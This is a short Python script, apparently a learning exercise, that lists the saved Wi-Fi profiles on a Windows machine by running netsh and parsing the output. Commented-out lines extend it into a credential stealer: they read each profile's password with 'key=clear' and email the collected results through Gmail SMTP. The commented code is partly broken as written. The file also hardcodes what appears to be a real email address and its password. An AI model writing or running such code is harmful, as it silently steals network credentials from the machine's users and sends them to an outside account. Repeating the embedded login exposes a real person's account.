#!usr/bin/env python3

import subprocess
import smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command,shell=True)
network_names_list = re.findall(b"(?:Profile\s*:\s)(.*)(?:\\r)",networks)


result = ""
for network_names in network_names_list:
    # n1=(str(network_names))
    # n2=n1.replace("b'","")
    # n3=n2.replace("'","")
    # print(n3)
    network_name = str(network_names)
    network_name1 = network_name.replace("b'","")
    network_name2=network_name1.replace("'","")
    print(network_name2)

    # command = "netsh wlan show profile " + network_names + "key=clear"
    # current_result = subprocess.check_output(command, shell=True)
    # result = result + current_result
# send_mail("prathishbv.19it@kongu.edu", "bvprathishsri7701", result)
